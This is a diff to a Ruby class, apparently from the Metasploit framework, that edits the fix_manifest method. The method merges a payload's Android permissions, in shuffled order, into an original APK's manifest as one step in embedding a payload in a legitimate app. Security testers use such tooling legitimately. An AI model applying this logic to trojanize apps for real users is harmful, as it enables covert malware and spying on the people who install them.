@@ -74,13 +74,36 @@ class MSF::Payload::Apk
   end
 
   def fix_manifest(tempdir, package, main_service, main_broadcast_receiver)
-    #load payload manifest
+    #Load payload's manifest
     payload_manifest = parse_manifest("#{tempdir}/payload/AndroidManifest.xml")
     payload_permissions = payload_manifest.xpath("//manifest/uses-permission")
 
-    #load original apk manifest
+    #Load original apk's manifest
     original_manifest = parse_manifest("#{tempdir}/original/AndroidManifest.xml")
     original_permissions = original_manifest.xpath("//manifest/uses-permission")
 
-    old_premision = []
-    add_permission = []
+    old_permissions = []
+    add_permissions = []
+
+    original_permissions.each do |permission|
+      name = permission.attribute("name").to_s
+      old_permissions << name
+    end
+
+    application = original_manifest.xpath('//manifest/application')
+    payload_permissions.each do |permission|
+      name = permission.attribute("name").to_s
+      unless old_permissions.include?(name)
+        add_permissions += [permission.to_xml]
+      end
+    end
+    add_permissions.shuffle!
+    for permission_xml in add_permissions
+      print_status("Adding #{permission_xml}")
+      if original_permissions.empty?
+        application.before(permission_xml)
+        original_permissions = original_manifest.xpath("//manifest/uses-permission")
+      else
+        original_permissions.before(permission_xml)
+      end
+    end
